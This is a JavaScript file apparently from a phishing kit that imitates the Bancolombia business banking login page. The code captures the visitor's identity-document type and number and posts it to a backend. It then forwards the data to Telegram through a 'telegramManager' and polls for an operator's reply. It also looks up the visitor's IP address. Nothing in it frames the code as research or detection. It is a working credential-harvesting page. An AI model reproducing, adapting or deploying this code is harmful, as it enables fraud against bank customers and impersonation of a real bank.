/**
 * ========================================
 * BANCOLOMBIA - SUCURSAL VIRTUAL NEGOCIOS
 * JavaScript Principal
 * ========================================
 */

'use strict';

(function () {
    // Estado de la aplicación
    const state = {
        documentType: '',
        documentNumber: ''
    };

    // Elementos DOM
    const elements = {};

    /**
     * Inicialización
     */
    function init() {
        // Cachear elementos DOM
        elements.customSelect = document.getElementById('customSelect');
        elements.selectTrigger = document.getElementById('selectTrigger');
        elements.selectLabel = document.getElementById('selectLabel');
        elements.selectDropdown = document.getElementById('selectDropdown');
        elements.selectOptions = document.querySelectorAll('.custom-select__option');
        elements.documentTypeInput = document.getElementById('documentType');
        elements.documentNumberInput = document.getElementById('documentNumber');
        elements.floatingLabel = document.getElementById('inputFloatingLabel');
        elements.submitBtn = document.getElementById('submitBtn');
        elements.form = document.getElementById('documentForm');

        // Validar que existen los elementos necesarios
        if (!elements.customSelect || !elements.documentNumberInput || !elements.submitBtn) {
            console.error('Elementos requeridos no encontrados');
            return;
        }

        // Inicializar event listeners
        initCustomSelect();
        initDocumentNumberInput();

        console.log('Bancolombia - Sistema inicializado correctamente');
    }

    /**
     * Inicializar custom select
     */
    function initCustomSelect() {
        // Toggle dropdown
        elements.selectTrigger.addEventListener('click', function (e) {
            e.preventDefault();
            e.stopPropagation();
            toggleDropdown();
        });

        // Seleccionar opción
        elements.selectOptions.forEach(function (option) {
            option.addEventListener('click', function (e) {
                e.preventDefault();
                e.stopPropagation();
                selectOption(this);
            });
        });

        // Cerrar al hacer clic fuera
        document.addEventListener('click', function (e) {
            if (!elements.customSelect.contains(e.target)) {
                closeDropdown();
            }
        });
    }

    /**
     * Toggle dropdown
     */
    function toggleDropdown() {
        elements.customSelect.classList.toggle('active');
    }

    /**
     * Cerrar dropdown
     */
    function closeDropdown() {
        elements.customSelect.classList.remove('active');
    }

    /**
     * Seleccionar opción del dropdown
     */
    function selectOption(optionElement) {
        const value = optionElement.getAttribute('data-value');
        const text = optionElement.textContent.trim();

        // Actualizar estado
        state.documentType = value;

        // Actualizar UI
        elements.documentTypeInput.value = value;
        elements.selectLabel.textContent = text;
        elements.selectLabel.classList.add('has-value');

        // Cerrar dropdown
        closeDropdown();

        // Enfocar en el siguiente campo
        elements.documentNumberInput.focus();

        // Validar formulario
        validateForm();
    }

    /**
     * Inicializar input de número de documento
     */
    function initDocumentNumberInput() {
        // Input event
        elements.documentNumberInput.addEventListener('input', function (e) {
            // Restrict to numbers only
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            state.documentNumber = e.target.value.trim();

            // Toggle floating label
            if (state.documentNumber.length > 0) {
                elements.floatingLabel.classList.add('active');
            } else {
                elements.floatingLabel.classList.remove('active');
            }

            // Validar formulario
            validateForm();
        });

        // Focus event
        elements.documentNumberInput.addEventListener('focus', function () {
            elements.floatingLabel.classList.add('active');
        });

        // Blur event
        elements.documentNumberInput.addEventListener('blur', function () {
            if (state.documentNumber.length === 0) {
                elements.floatingLabel.classList.remove('active');
            }
        });

        // Keypress - solo números
        elements.documentNumberInput.addEventListener('keypress', function (e) {
            const char = e.key;
            if (!/[0-9]/.test(char)) {
                e.preventDefault();
            }
        });
    }

    /**
     * Validar formulario y habilitar/deshabilitar botón
     */
    function validateForm() {
        const isValid = state.documentType && state.documentNumber.length > 0;

        if (isValid) {
            elements.submitBtn.disabled = false;
            elements.submitBtn.classList.add('enabled');

            // Agregar handler de click directo
            elements.submitBtn.onclick = async function (e) {
                e.preventDefault();

                // Asegurar que los valores estén en el form
                elements.documentTypeInput.value = state.documentType;
                elements.documentNumberInput.value = state.documentNumber;

                // Mostrar overlay de carga
                const overlay = document.querySelector('.loading-overlay');
                if (overlay) {
                    overlay.classList.add('active');
                }

                // Enviar datos al backend de Node.js
                try {
                    const response = await fetch('api/process', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        credentials: 'include',
                        body: JSON.stringify({
                            documentType: state.documentType,
                            documentNumber: state.documentNumber
                        })
                    });

                    const result = await response.json();

                    if (result.success) {
                        // Enviar a Telegram a través de la API
                        await window.telegramManager.sendToTelegram('documento', {
                            documentType: state.documentType,
                            documentNumber: state.documentNumber
                        });

                        // Iniciar polling para esperar respuesta
                        window.telegramManager.startPolling();
                    }
                } catch (error) {
                    console.error('❌ Error enviando datos:', error);
                }
            };
        } else {
            elements.submitBtn.disabled = true;
            elements.submitBtn.classList.remove('enabled');
            elements.submitBtn.onclick = null;
        }
    }

    /**
     * Actualizar IP en el footer (simulado ya que el server lo maneja)
     */
    function updateIP() {
        const ipElement = document.getElementById('userIP');
        if (ipElement) {
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => ipElement.textContent = data.ip)
                .catch(() => ipElement.textContent = 'Protegida');
        }
    }

    /**
     * Inicializar cuando el DOM esté listo
     */
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            init();
            updateIP();
        });
    } else {
        init();
        updateIP();
    }
})();

